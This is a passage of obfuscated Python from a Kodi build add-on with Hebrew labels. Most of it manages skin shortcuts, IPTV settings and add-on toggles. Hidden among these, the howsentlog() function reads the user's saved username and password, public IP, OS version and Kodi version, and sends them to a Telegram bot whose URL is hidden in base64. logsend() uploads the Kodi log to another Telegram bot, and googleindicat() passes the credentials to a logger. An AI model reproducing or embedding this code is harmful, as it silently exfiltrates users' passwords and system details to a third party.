            <bottom>64</bottom>
            <left>0</left>
            <right>0</right>
            <include>Animation_SlideIn</include>
            <include>Animation_FadeOut</include>
            <animation effect="slide" tween="quadratic" easing="out" time="300" start="0,1920" end="0">WindowOpen</animation>
            <animation effect="slide" tween="quadratic" easing="in" time="300" end="0,1920" start="0">WindowClose</animation>
            <include>Dialog_Background</include>
            <control type="group">
                <top>70</top>
                <right>side</right>
                <left>1430</left>
                <align>right</align>
                <height>621</height>
                <control type="group">
                    <width>460</width>
                    <height>621</height>
                    <include content="Object_Line_Settings">
                        <param name="width" value="460" />
                        <param name="label" value="$INFO[Control.GetLabel(20)]" />
                    </include>
                    <!-- <include>Object_FlatBackground</include> -->
                    <control type="grouplist" id="3">
                        <ondown>8000</ondown>
                        <onup>noop</onup>
                        <onleft>5</onleft>
                        <onright>5</onright>
                        <width>100%</width>
						<align>right</align>
                        <height>621</height>
                        <orientation>vertical</orientation>
                        <itemgap>0</itemgap>
                    </control>
                </control>

                <control type="group">
                    <right>480</right>
                    <width>1400</width>
                    <height>621</height>
                    <include content="Object_Line_Settings">
                        <param name="width" value="1400" />
                        <param name="label" value="$LOCALIZE[33063]" />
                    </include>
					
                    <control type="grouplist" id="5">
                        <width>100%</width>
                        <height>621</height>
                        <ondown>8000</ondown>
                        <onup>noop</onup>
                        <onright>3</onright>
                        <onleft>8000</onleft>
                        <orientation>vertical</orientation>
                        <itemgap>0</itemgap>
                    </control>
                </control> 

            </control>

            <!-- Default Templates -->
            <control type="button" id="7">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="radiobutton" id="8">
                <width>100%</width>
                <align>right</align>
                <radioposx>40</radioposx>
                <include>Defs_OptionButton</include>
            </control>
            <control type="spincontrolex" id="9">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="image" id="11">
                <width>100%</width>
                <height>72</height>
                <texture border="30">common/div.png</texture>
                <include>Defs_OptionButton</include>
            </control>
            <control type="edit" id="12">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="label" id="14">
                <width>100%</width>
                <height>72</height>
                <align>right</align>
                <font>Font-ListInfo-Small-Bold</font>
                <textcolor>LineLabel</textcolor>
            </control>
            <control type="sliderex" id="13">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>

            <!-- Default Templates Category -->
            <control type="button" id="10">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>

            <!-- Ok Cancel Defaults -->
            <control type="grouplist" id="8000">
                <centerleft>50%</centerleft>
                <width>1240</width>
                <bottom>side</bottom>
                <height>69</height>
                <align>center</align>
                <itemgap>20</itemgap>
                <onleft>3</onleft>
                <onright>3</onright>
                <onup>3</onup>
                <ondown>noop</ondown>
                <orientation>horizontal</orientation>
                <control type="button" id="28">
                    <align>center</align>
                    <width>400</width>
                    <label>186</label>
                    <include>Defs_OptionButton2</include>
                    <visible>Control.IsEnabled(10)</visible>
                </control>
                <control type="button" id="29">
                    <align>center</align>
                    <width>400</width>
                    <label>222</label>
                    <include>Defs_OptionButton2</include>
                    <visible>Control.IsEnabled(11)</visible>
                </control>
                <control type="button" id="30">
                    <align>center</align>
                    <width>400</width>
                    <label>409</label>
                    <include>Defs_OptionButton2</include>
                    <visible>Control.IsEnabled(12)</visible>
                </control>
            </control>
        </control>
        <control type="label" id="2"><width>1</width><top>-2000</top><height>1</height><visible>false</visible></control>

    </controls>

</window>
''')#line:817
    with open (OOOO00OO00O0O00OO ,'w')as OO0OO0O000OO00O00 :#line:820
      OO0OO0O000OO00O00 .write (O0OOO00O00OOOOOOO )#line:821
def testcommand ():#line:822
    wiz .clearCache (True )#line:823
def autotrakt ():#line:828
    OOOOOOOOOO00O0O0O =(ADDON .getSetting ("auto_trk"))#line:829
    if OOOOOOOOOO00O0O0O =='true':#line:830
       from resources .libs import trk_aut #line:831
def traktsync ():#line:833
     O000OOOO0000OOOO0 =(ADDON .getSetting ("auto_trk"))#line:834
     if O000OOOO0000OOOO0 =='true':#line:835
       from resources .libs import trk_aut #line:838
     else :#line:839
        ADDON .openSettings ()#line:840
def imdb_synck ():#line:842
   try :#line:843
     OO0000O00O00O0O00 =xbmcaddon .Addon ('plugin.video.exodusredux')#line:844
     OOO0OO000OO0OOO0O =xbmcaddon .Addon ('plugin.video.gaia')#line:845
     OO00O0OOO000O0O00 =(ADDON .getSetting ("imdb_sync"))#line:846
     O000O0OOO0O0O000O ="imdb.user"#line:847
     O00OOOOOO0O00O00O ="accounts.informants.imdb.user"#line:848
     OO0000O00O00O0O00 .setSetting (O000O0OOO0O0O000O ,str (OO00O0OOO000O0O00 ))#line:849
     OOO0OO000OO0OOO0O .setSetting ('accounts.informants.imdb.enabled','true')#line:850
     OOO0OO000OO0OOO0O .setSetting (O00OOOOOO0O00O00O ,str (OO00O0OOO000O0O00 ))#line:851
   except :pass #line:852
def dis_or_enable_addon (O0000OO0OOO000000 ,OO0OOO000OO0OO000 ,enable ="true"):#line:854
    import json #line:855
    O000OO0OO00O0OO0O ='"%s"'%O0000OO0OOO000000 #line:856
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%O0000OO0OOO000000 )and enable =="true":#line:857
        logging .warning ('already Enabled')#line:858
        return xbmc .log ("### Skipped %s, reason = allready enabled"%O0000OO0OOO000000 )#line:859
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%O0000OO0OOO000000 )and enable =="false":#line:860
        return xbmc .log ("### Skipped %s, reason = not installed"%O0000OO0OOO000000 )#line:861
    else :#line:862
        O0O0OOOOOOOO0OOO0 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O000OO0OO00O0OO0O ,enable )#line:863
        OOO0O0OOO0O00000O =xbmc .executeJSONRPC (O0O0OOOOOOOO0OOO0 )#line:864
        OO0O0OOO000O000O0 =json .loads (OOO0O0OOO0O00000O )#line:865
        if enable =="true":#line:866
            xbmc .log ("### Enabled %s, response = %s"%(O0000OO0OOO000000 ,OO0O0OOO000O000O0 ))#line:867
        else :#line:868
            xbmc .log ("### Disabled %s, response = %s"%(O0000OO0OOO000000 ,OO0O0OOO000O000O0 ))#line:869
    if OO0OOO000OO0OO000 =='auto':#line:870
     return True #line:871
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:872
def iptvset ():#line:875
  try :#line:876
    OO0OOO00O00000OOO =(ADDON .getSetting ("iptv_on"))#line:877
    if OO0OOO00O00000OOO =='true':#line:879
       if KODIV >=17 and KODIV <18 :#line:881
         dis_or_enable_addon (('pvr.iptvsimple'),mode )#line:882
         O00O000000000O00O =xbmcaddon .Addon ('pvr.iptvsimple')#line:883
         OOOO00O000O0O00O0 =(ADDON .getSetting ("iptvUrl"))#line:885
         O00O000000000O00O .setSetting ('m3uUrl',OOOO00O000O0O00O0 )#line:886
         O000OOO000OOO0OO0 =(ADDON .getSetting ("epg_Url"))#line:887
         O00O000000000O00O .setSetting ('epgUrl',O000OOO000OOO0OO0 )#line:888
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.windows'):#line:891
         iptvsimpldownpc ()#line:892
         wiz .kodi17Fix ()#line:893
         xbmc .sleep (1000 )#line:894
         O00O000000000O00O =xbmcaddon .Addon ('pvr.iptvsimple')#line:895
         OOOO00O000O0O00O0 =(ADDON .getSetting ("iptvUrl"))#line:896
         O00O000000000O00O .setSetting ('m3uUrl',OOOO00O000O0O00O0 )#line:897
         O000OOO000OOO0OO0 =(ADDON .getSetting ("epg_Url"))#line:898
         O00O000000000O00O .setSetting ('epgUrl',O000OOO000OOO0OO0 )#line:899
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.android'):#line:901
         iptvsimpldown ()#line:902
         wiz .kodi17Fix ()#line:903
         xbmc .sleep (1000 )#line:904
         O00O000000000O00O =xbmcaddon .Addon ('pvr.iptvsimple')#line:905
         OOOO00O000O0O00O0 =(ADDON .getSetting ("iptvUrl"))#line:906
         O00O000000000O00O .setSetting ('m3uUrl',OOOO00O000O0O00O0 )#line:907
         O000OOO000OOO0OO0 =(ADDON .getSetting ("epg_Url"))#line:908
         O00O000000000O00O .setSetting ('epgUrl',O000OOO000OOO0OO0 )#line:909
  except :pass #line:910
def howsentlog ():#line:917
       try :#line:919
          import json #line:920
          OO0000OO0OO0O000O =(ADDON .getSetting ("user"))#line:921
          O0OOOO00O000O00OO =(ADDON .getSetting ("pass"))#line:922
          O00OO00000O0OOOOO =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:923
          O00O0000OO0000OOO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDY5NDQ4MDg4NzpBQUU2bTAxRXJpNnZNTGRjN0JfT3lSX19yWFNSRzl0VE9JQS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE2NTIyOTQwJnRleHQ9JTIwJTIwJTIw16nXnNeXJTIw15zXmiUyMNec15XXkg=='#line:925
          O00O000OO0O0O00O0 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:926
          O0OO0OOO0OO0O00OO =str (json .loads (O00O000OO0O0O00O0 )['ip'])#line:927
          OOOOOOO00OOOOOO0O =OO0000OO0OO0O000O #line:928
          OO00OO0OOOO0O0O00 =O0OOOO00O000O00OO #line:929
          xbmc .getInfoLabel ('System.OSVersionInfo')#line:930
          xbmc .sleep (1500 )#line:931
          OO0OOOO000OOOO0OO =xbmc .getInfoLabel ('System.OSVersionInfo')#line:932
          import socket #line:934
          O00O000OO0O0O00O0 =urllib2 .urlopen (O00O0000OO0000OOO .decode ('base64')+' מערכת הפעלה: '+OO0OOOO000OOOO0OO +' שם משתמש: '+OOOOOOO00OOOOOO0O +' סיסמה: '+OO00OO0OOOO0O0O00 +' קודי: '+O00OO00000O0OOOOO +' כתובת: '+O0OO0OOO0OO0O00OO ).readlines ()#line:935
       except :pass #line:937
def googleindicat ():#line:940
			import logg #line:941
			OOO0OOO0OO00OOO0O =(ADDON .getSetting ("pass"))#line:942
			O0OOOO0OOO00OO000 =(ADDON .getSetting ("user"))#line:943
			logg .logGA (OOO0OOO0OO00OOO0O ,O0OOOO0OOO00OO000 )#line:944
def logsend ():#line:945
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]שולח לוג אנא המתן[/COLOR]'%COLOR2 )#line:946
      OO000OO0O0OOO00O0 =xbmcgui .DialogBusy ()#line:947
      OO000OO0O0OOO00O0 .create ()#line:948
      if not os .path .exists (xbmc .translatePath ("special://home/addons/")+'script.module.requests'):#line:949
        xbmc .executebuiltin ("RunPlugin(plugin://script.module.requests)")#line:950
      howsentlog ()#line:952
      import requests #line:953
      if xbmc .getCondVisibility ('system.platform.windows'):#line:954
         O00000O0O00O00OO0 =xbmc .translatePath ('special://home/kodi.log')#line:955
         OO000OOO00O0OO000 ={'chat_id':(None ,'-1001416522940'),'document':(O00000O0O00O00OO0 ,open (O00000O0O00O00OO0 ,'rb')),}#line:959
         O0OOO0OO0O0O000OO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:960
         OOOOOOO0O0OO0OOO0 =requests .post (O0OOO0OO0O0O000OO .decode ('base64'),files =OO000OOO00O0OO000 )#line:962
      elif xbmc .getCondVisibility ('system.platform.android'):#line:963
           O00000O0O00O00OO0 =xbmc .translatePath ('special://temp/kodi.log')#line:964
           OO000OOO00O0OO000 ={'chat_id':(None ,'-1001416522940'),'document':(O00000O0O00O00OO0 ,open (O00000O0O00O00OO0 ,'rb')),}#line:968
           O0OOO0OO0O0O000OO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:969
           OOOOOOO0O0OO0OOO0 =requests .post (O0OOO0OO0O0O000OO .decode ('base64'),files =OO000OOO00O0OO000 )#line:971
      else :#line:972
           O00000O0O00O00OO0 =xbmc .translatePath ('special://kodi.log')#line:973
           OO000OOO00O0OO000 ={'chat_id':(None ,'-1001416522940'),'document':(O00000O0O00O00OO0 ,open (O00000O0O00O00OO0 ,'rb')),}#line:977
           O0OOO0OO0O0O000OO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:978
           OOOOOOO0O0OO0OOO0 =requests .post (O0OOO0OO0O0O000OO .decode ('base64'),files =OO000OOO00O0OO000 )#line:980
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:981
def rdoff ():#line:983
	OO0OOO0OOOOOOO0O0 =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:1014
	O00O00OOO000O0OOO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1015
	copyfile (OO0OOO0OOOOOOO0O0 ,O00O00OOO000O0OOO )#line:1016
def skindialogsettind18 ():#line:1017
	try :#line:1018
		O0OOOOOO0O00O00OO =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:1019
		O0OO0000O0O000OO0 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:1020
		copyfile (O0OOOOOO0O00O00OO ,O0OO0000O0O000OO0 )#line:1021
	except :pass #line:1022
def rdon ():#line:1023
	loginit .loginIt ('restore','all')#line:1024
	O0OOO000OOOO00OOO =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:1026
	OO00OO0O0000OOO00 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1027
	copyfile (O0OOO000OOOO00OOO ,OO00OO0O0000OOO00 )#line:1028
def adults18 ():#line:1030
  O0O0O0O0000000000 =(ADDON .getSetting ("adults"))#line:1031
  if O0O0O0O0000000000 =='true':#line:1032
    OO000O0O0O0OO0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1033
    with open (OO000O0O0O0OO0OOO ,'r')as O00OOOO00000OOOO0 :#line:1034
      O0O000O0OO00OO0O0 =O00OOOO00000OOOO0 .read ()#line:1035
    O0O000O0OO00OO0O0 =O0O000O0OO00OO0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1053
    with open (OO000O0O0O0OO0OOO ,'w')as O00OOOO00000OOOO0 :#line:1056
      O00OOOO00000OOOO0 .write (O0O000O0OO00OO0O0 )#line:1057
def rdbuildaddon ():#line:1058
  OO000OOOOO000OO0O =(ADDON .getSetting ("auto_rd"))#line:1059
  if OO000OOOOO000OO0O =='true':#line:1060
    O00OOOOOOOO0O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1061
    with open (O00OOOOOOOO0O0OOO ,'r')as O0OO0000OO0O0OOO0 :#line:1062
      O0000OO00OOO0000O =O0OO0000OO0O0OOO0 .read ()#line:1063
    O0000OO00OOO0000O =O0000OO00OOO0000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1081
    with open (O00OOOOOOOO0O0OOO ,'w')as O0OO0000OO0O0OOO0 :#line:1084
      O0OO0000OO0O0OOO0 .write (O0000OO00OOO0000O )#line:1085
    O00OOOOOOOO0O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1089
    with open (O00OOOOOOOO0O0OOO ,'r')as O0OO0000OO0O0OOO0 :#line:1090
      O0000OO00OOO0000O =O0OO0000OO0O0OOO0 .read ()#line:1091
    O0000OO00OOO0000O =O0000OO00OOO0000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1109
    with open (O00OOOOOOOO0O0OOO ,'w')as O0OO0000OO0O0OOO0 :#line:1112
      O0OO0000OO0O0OOO0 .write (O0000OO00OOO0000O )#line:1113
    O00OOOOOOOO0O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1117
    with open (O00OOOOOOOO0O0OOO ,'r')as O0OO0000OO0O0OOO0 :#line:1118
      O0000OO00OOO0000O =O0OO0000OO0O0OOO0 .read ()#line:1119
    O0000OO00OOO0000O =O0000OO00OOO0000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1137
    with open (O00OOOOOOOO0O0OOO ,'w')as O0OO0000OO0O0OOO0 :#line:1140
      O0OO0000OO0O0OOO0 .write (O0000OO00OOO0000O )#line:1141
    O00OOOOOOOO0O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1145
    with open (O00OOOOOOOO0O0OOO ,'r')as O0OO0000OO0O0OOO0 :#line:1146
      O0000OO00OOO0000O =O0OO0000OO0O0OOO0 .read ()#line:1147
    O0000OO00OOO0000O =O0000OO00OOO0000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1165
    with open (O00OOOOOOOO0O0OOO ,'w')as O0OO0000OO0O0OOO0 :#line:1168
      O0OO0000OO0O0OOO0 .write (O0000OO00OOO0000O )#line:1169
    O00OOOOOOOO0O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1172
    with open (O00OOOOOOOO0O0OOO ,'r')as O0OO0000OO0O0OOO0 :#line:1173
      O0000OO00OOO0000O =O0OO0000OO0O0OOO0 .read ()#line:1174
    O0000OO00OOO0000O =O0000OO00OOO0000O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1192
    with open (O00OOOOOOOO0O0OOO ,'w')as O0OO0000OO0O0OOO0 :#line:1195
      O0OO0000OO0O0OOO0 .write (O0000OO00OOO0000O )#line:1196
    O00OOOOOOOO0O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1198
    with open (O00OOOOOOOO0O0OOO ,'r')as O0OO0000OO0O0OOO0 :#line:1199
      O0000OO00OOO0000O =O0OO0000OO0O0OOO0 .read ()#line:1200
    O0000OO00OOO0000O =O0000OO00OOO0000O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1218
    with open (O00OOOOOOOO0O0OOO ,'w')as O0OO0000OO0O0OOO0 :#line:1221
      O0OO0000OO0O0OOO0 .write (O0000OO00OOO0000O )#line:1222
    O00OOOOOOOO0O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1224
    with open (O00OOOOOOOO0O0OOO ,'r')as O0OO0000OO0O0OOO0 :#line:1225
      O0000OO00OOO0000O =O0OO0000OO0O0OOO0 .read ()#line:1226
    O0000OO00OOO0000O =O0000OO00OOO0000O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1244
    with open (O00OOOOOOOO0O0OOO ,'w')as O0OO0000OO0O0OOO0 :#line:1247
      O0OO0000OO0O0OOO0 .write (O0000OO00OOO0000O )#line:1248
    O00OOOOOOOO0O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1251
    with open (O00OOOOOOOO0O0OOO ,'r')as O0OO0000OO0O0OOO0 :#line:1252
      O0000OO00OOO0000O =O0OO0000OO0O0OOO0 .read ()#line:1253
    O0000OO00OOO0000O =O0000OO00OOO0000O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1271
    with open (O00OOOOOOOO0O0OOO ,'w')as O0OO0000OO0O0OOO0 :#line:1274
      O0OO0000OO0O0OOO0 .write (O0000OO00OOO0000O )#line:1275
def rdbuildinstall ():#line:1278
  try :#line:1279
   OO0000O0OOO0O00O0 =(ADDON .getSetting ("auto_rd"))#line:1280
   if OO0000O0OOO0O00O0 =='true':#line:1281
     OOOO0O0000O0OO00O =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:1282
     O0O0OO0OOO000OO0O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1283
     copyfile (OOOO0O0000O0OO00O ,O0O0OO0OOO000OO0O )#line:1284
  except :#line:1285
     pass #line:1286
def rdbuildaddonoff ():#line:1289
    OO000OO0O0O000000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1292
    with open (OO000OO0O0O000000 ,'r')as OOOOOOOOOO0OOO000 :#line:1293
      O00O0O00O00O000OO =OOOOOOOOOO0OOO000 .read ()#line:1294
    O00O0O00O00O000OO =O00O0O00O00O000OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1312
    with open (OO000OO0O0O000000 ,'w')as OOOOOOOOOO0OOO000 :#line:1315
      OOOOOOOOOO0OOO000 .write (O00O0O00O00O000OO )#line:1316
    OO000OO0O0O000000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1320
    with open (OO000OO0O0O000000 ,'r')as OOOOOOOOOO0OOO000 :#line:1321
      O00O0O00O00O000OO =OOOOOOOOOO0OOO000 .read ()#line:1322
    O00O0O00O00O000OO =O00O0O00O00O000OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1340
    with open (OO000OO0O0O000000 ,'w')as OOOOOOOOOO0OOO000 :#line:1343
      OOOOOOOOOO0OOO000 .write (O00O0O00O00O000OO )#line:1344
    OO000OO0O0O000000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1348
    with open (OO000OO0O0O000000 ,'r')as OOOOOOOOOO0OOO000 :#line:1349
      O00O0O00O00O000OO =OOOOOOOOOO0OOO000 .read ()#line:1350
    O00O0O00O00O000OO =O00O0O00O00O000OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1368
